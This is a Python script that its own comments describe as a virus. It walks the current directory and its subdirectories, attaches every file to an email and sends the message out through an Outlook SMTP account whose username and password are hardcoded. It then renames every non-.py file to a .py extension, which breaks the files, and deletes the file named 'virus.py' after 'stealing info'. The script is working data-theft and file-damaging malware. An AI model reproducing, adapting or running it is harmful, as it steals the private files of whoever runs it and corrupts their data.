
__author__ = 'Xue Wei Fan'

import os
import sys
import smtplib
import shutil
# For guessing MIME type based on file name extension
import mimetypes


from email import encoders
from email.message import Message
from email.mime.audio import MIMEAudio
from email.mime.base import MIMEBase
from email.mime.image import MIMEImage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


def main():
      
    directory = os.getcwd()   #get current working directory
    if not directory:         #check if current directory exists just in case os.getcwd() fail
        directory = '.'       #current directory, you can just set directory = '.' in the beginning if you want
        
        
    # Create the enclosing (msg) message
    msg = MIMEMultipart()
    sender_addr = "hackerfxw@outlook.com"
    recipient_addr = " Please put the email address you want the info sent to here"
    msg['Subject'] = 'Contents of directory %s' % os.path.abspath(directory)
    msg['From'] = sender_addr
    msg['To'] = recipient_addr
    msg.preamble = 'You will not see this in a MIME-aware mail reader.\n'
    
    
    for dirpath, subdirs, files in os.walk(directory):  # this will go through each subdirectories in current directory
      #print dirpath  # this will print each subdirectories
      #print subdirs
      for filename in files: #os.listdir(directory):
      
        path = os.path.join(dirpath, filename) # get absolute path for each file in directory or subdirectories
        

        
        # Guess the content type based on the file's extension.  Encoding
        # will be ignored, although we should check for simple things like
        # gzip'd or compressed files.
        ctype, encoding = mimetypes.guess_type(path)
        if ctype is None or encoding is not None:
            # No guess could be made, or the file is encoded (compressed), so
            # use a generic bag-of-bits type.
            ctype = 'application/octet-stream'
        maintype, subtype = ctype.split('/', 1)
        
        
        if maintype == 'text':
            with open(path,"r") as fp:
                # Note: we should handle calculating the charset
                msgbody = MIMEText(fp.read(), _subtype=subtype)
                
        elif maintype == 'image':
            with open(path, 'rb') as fp:
                msgbody = MIMEImage(fp.read(), _subtype=subtype)
        elif maintype == 'audio':
            with open(path, 'rb') as fp:
                msgbody = MIMEAudio(fp.read(), _subtype=subtype)
        else:
            with open(path, 'rb') as fp:
                msgbody = MIMEBase(maintype, subtype)
                msgbody.set_payload(fp.read())
            # Encode the payload using Base64
            encoders.encode_base64(msgbody)
            
     
        # Set the filename parameter
        msgbody.add_header('Content-Disposition', 'attachment', filename=filename) # send file as attachment with its name
        msg.attach(msgbody)  # add each file in current dir and subdirectories to MIMEMultipart() for email later
        
        # delete the virus file after stealing info
        if filename == "virus.py":
        #shutil.copy("proj1.py",dirpath) # copy file to another directory dirpath
           #print path
           os.remove(path) 

        #separate name and extension of current file
        filename = os.path.splitext(path)[0]          # get the file name
        extention = os.path.splitext(path)[1]          #get the file extention
     
        # change the file extention to .py
        if extention != ".py":
           os.rename(path, filename+".py")   
          
        
    # Now send or store the message
    messages = msg.as_string()
    #print(path)
    # connect to server 
    #server = smtplib.SMTP('smtp.gmail.com', 587) #(Note: if you use this approach with Gmail you'll have to turn
    #on the "less secure apps" option in Gmail
    server = smtplib.SMTP('smtp-mail.outlook.com', '587')
    server.ehlo()
    server.starttls()
    server.ehlo()
    server.login('hackerfxw@outlook.com', 'xueweifan123')
    # send mail
    server.sendmail(sender_addr, recipient_addr, messages)
    server.quit()
    
    

if __name__ == '__main__':
    main()

